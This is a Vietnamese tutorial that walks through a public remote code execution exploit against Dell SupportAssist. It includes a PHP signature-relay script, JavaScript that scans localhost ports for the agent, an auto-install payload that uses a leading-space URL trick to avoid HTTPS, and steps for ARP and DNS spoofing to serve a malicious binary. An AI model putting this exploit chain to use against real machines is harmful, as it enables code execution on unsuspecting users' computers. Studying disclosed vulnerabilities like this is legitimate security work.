# 1.Tiến hành khai thác demo(POC)
 ## 1.1 Tổng quan chung
 &nbsp;&nbsp;Vấn đề đầu tiên chúng ta gặp phải là tạo request đến **SupportAssist client**. Giả sử chúng ta đang ở trong context của một  Dell subdomain. Vậy để bắt đầu, điều quan trọng nhất là chúng ta phải mô phỏng cách mà Browser thực hiện và tạo các request với Javascript. </br>
 ## 1.2 Phân tích các vấn đề gặp phải và cơ chế tấn công.
 
  &nbsp;&nbsp; Thứ nhất, chúng ta phải tìm các port chạy dịch vụ. Chúng ta làm việc này bằng cách duyệt tuần tự qua các port đã được đề cập trong bài trước và thực hiện requests đến **“/clientservice/isalive”** . Vấn đề là chúng ta cần có  **signature**, để có signature chúng ta có thể tạo request đến  “https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken” để lấy signature. <br>
    &nbsp;&nbsp; Cách lấy signature này hơi khác một chút, chúng ta không thể lấy 1 cách trực tiếp. **“Access-Control-Allow-Origin”** của signature url được set là “https://www.dell.com”. Vấn đề đặt ra là chúng ta đang ở trong subdomain của Dell và có thể môi trường subdomain này không là giao thức HTTPS.  Vậy là sao để vượt qua??? Giải pháp đưa ra: chúng ta sẽ thực thi các yêu cầu từ server của chúng ta...<br>
     &nbsp;&nbsp; Có một điểm yếu ở cơ chế này là các **"signature"** lấy từ server của Dell **“getdsdtoken"** có thể dùng cho rất nhiều thiết bị chứ không phải là cho một máy. Vậy nên ở server của chúng ta chỉ cần viết 1 đoạn script PHP: 
```php
<?php
header('Access-Control-Allow-Origin: *');
echo file_get_contents('https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken');
?> 
```

**"Header call"** cho phép bất kỳ ai tạo một request đến file PHP này và file PHP này thực thi lấy "signature" từ máy chủ DELL về và trả lại, ở trường hợp này file PHP đóng vai trò như 1định tuyến để lấy signature từ “getdsdtoken”. Nó sẽ trả về đối tượng JSON và thời gian hết hạn của signature. Từ đây, chúng ta có thể lấy dữ liệu ra và thay thế vào vào đối tượng của JS để thực thi... <br>
  &nbsp;&nbsp; Bây giờ, chúng ta đã có signature rồi. Tạo một function lặp qua các port mặc định. nếu tìm được  chúng ta sẽ đặt port đó làm biến global để phục vụ các thao tác khác.
  
```js
  function FindServer() {
	ports.forEach(function(port) {
		var is_alive_url = "http://127.0.0.1:" + port + "/clientservice/isalive/?expires=" + signatures.Expires + "&signature=" + signatures.IsaliveToken;
		var response = SendAsyncRequest(is_alive_url, function(){server_port = port;});
	});
} 
```

Sau khi đã tìm được server chúng ta có thể gửi **payload**  của mình. Đây là phần khó nhất, chúng ta sẽ gặp phải một số vấn đề nghiêm trọng trước khi  có thể thực hiện **"downloadandautoinstal"**.<br>
 &nbsp;&nbsp; Bắt đầu với vấn đề khó nhất, ứng dụng SupportAssist có 1 danh sách các các tên miền cố định cho phép thực thi và nó được định nghĩa sẵn trong ứng dụng. Cụ thể, máy chủ  phải là 1 trong những website sau:  “ftp.dell.com”, “downloads.dell.com”, or “ausgesd4f1.aus.amer.dell.com”.  Và trên những website này không hề có  bất kỳ **"redirect vulnerability"** như là XSS hay gì gì đó,... Vì vậy chúng ta có thể sử dụng kỹ thuật "man-in-the-middle attack". <br>
 &nbsp;&nbsp;Nếu chúng ta có thể cung cấp cho  SupportAssist client với url giao thức HTTP:// thì chúng ta có thể chặn băt và thay đổi dữ liệu trả về. Nếu làm được vậy thì có thể giải quyết đc vấn đề trên...<br>
  &nbsp;&nbsp;Nhưng chúng ta lại gặp vấn đề tiếp theo, cơ chế này nhằm chống lại cơ chế tấn công "man-in-the-middle". Nhìn lại các bước trước ta thấy rằng nếu file URL là HTTP:// thì  sẽ bị thay thế bằng HTTPS://... Đây lại là 1 vấn đề tiếp theo, vì chúng ta không thể chặn bắt hay sửa đổi gói tin của HTTPS://.  key word để bypass vấn đề này chính là: "if the URL starts with http://, it will be replaced by https://"...  Điểm yếu ở đây lại nằm ở chỗ nếu URL **không** bắt đầu với "http://" thì nó sẽ không bị thay đổi kể cả trong chuổi URL có "http://" .**Vậy chúng ta sẽ thêm 1 "space"  vào đầu URL** ví dụ: "http://vlxxxxxxxxx.abc" đổi thành " http://vlxxxxxxxxx.abc".  vậy là đã OK! <br>
  Chúng ta sẽ tạo 1 functions để tự động gửi payloads.
  ```
  function SendRCEPayload() {
	var auto_install_url = "http://127.0.0.1:" + server_port + "/downloadservice/downloadandautoinstall?expires=" + signatures.Expires + "&signature=" + signatures.DownloadAndAutoInstallToken;
```

```
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", auto_install_url, true);

var files = [];

files.push({
"title": "SupportAssist RCE",
"category": "Serial ATA",
"name": "calc.EXE",
"location": " http://downloads.dell.com/calc.EXE", // those spaces are KEY
"isSecure": false,
"fileUniqueId": guid(),
"run": true,
"installOrder": 2,
"restricted": false,
"fileStatus": -99,
"driverId": "FXGNY",
"dupInstallReturnCode": 0,
"cssClass": "inactive-step",
"isReboot": false,
"scanPNPId": "PCI\\VEN_8086&DEV_282A&SUBSYS_08851028&REV_10",
"$$hashKey": "object:210"});

xmlhttp.send(JSON.stringify(files)); 
}
```

## 1.3 Các bước tấn công trong mạng
Bước tiếp theo, chúng ta sẽ thực hiện tấn công trong mạng local. Dưới đây là các bước thực hiện:
1. Lấy địa chỉ interface mạng.
2. Khởi chạy server giả mạo và tên file của payload mà chúng ta muốn gửi. Web server sẽ check xem "host header" có phải là: **downloads.dell.com**  không nếu đúng sẽ thực hiện gửi payload nhị phân. Nếu  host request  có "dell.com" trong đó  và không phải domain tải xuống thì nó sẽ gửi payload JS đã đề cập ở phía trên.
3. Tiếp theo chúng ta sẽ thực hiện tấn công ARP Spoof vào máy nạn nhân. Đầu tiên kích  hoạt IP forwarding sau đầu tấn công ARP spoof để làm cho máy nạn nhân nhận máy hacker làm gateway và gateway nhận máy chúng ta thành máy nạn nhân...
4. Cuối cùng, chúng ta DNS spoof bằng cách sử dụng iptables để chuyển hướng các DNS packets đến hàng đợi netfilter. Chúng ta lắng nghe trên hàng đợi netfilter và kiểm tra tên các DNS đã request có phải là target URL. Nếu đúng, thì chúng ta sẽ gửi lại DNS packet giả mạo chứa địa chỉ IP server fake độc hại của chúng ta... 
5. Khi nạn nhân truy cập vào server của chúng ta ( thông qua URL hoặc gián tiếp bằng iframe ), chúng ta sẽ gửi lại đoạn JS độc hại kia và nó sẽ thực thi trên máy nạn nhân, để tìm port dịch vụ cho agent và lấy signature từ file PHP đã tạo trước đó. Sau đó, sẽ gửi RCE payload. Khi mà RCE pay load được thực thi bởi  agent( cái agent phân tích trong phần 1 ý). nó sẽ tạo 1 request đến "downloads.dell.com" thì lúc này chúng ta sẽ trả về payload độc hại của chúng ta...

<br>

Như vậy là mình đã phân tích quá trình tấn công rồi nhá. Các file scipt và hướng dẫn có trong link:    "https://github.com/D4stiny/Dell-Support-Assist-RCE-PoC".  <br>

Đồng thời có video demo ở link: https://www.youtube.com/watch?time_continue=2&v=0cTfnZ04jgQ <br>

# 2 Chú thích và tham khảo

link: https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/